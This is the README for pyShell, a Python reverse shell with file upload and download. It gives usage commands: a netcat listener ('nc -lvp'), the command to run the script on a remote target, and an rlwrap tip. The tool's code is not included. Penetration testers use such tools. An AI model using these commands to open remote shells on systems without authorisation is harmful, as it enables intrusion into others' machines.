# pyShell

pyShell is a reverse shell with upload/download functionality. Deploy and execute pyShell.py on the remote system and catch with netcat.

Usage: on your local system run.      
       nc -lvp <port number>
       on the remote system run.       
       python3 pyshell.py -t <target ip> -p <port number>
  
Requirements: Remote system must have python3 installed, or pyshell.py must be compiled with pyinstaller.

Recommendation: Install rlwrap and prefix local receiver command with rlwrap for improved tab completion.
                rlwrap nc -lvp <port number>

![image](https://raw.githubusercontent.com/MK-Kaiser/portfolio/master/images/pyShell.gif)
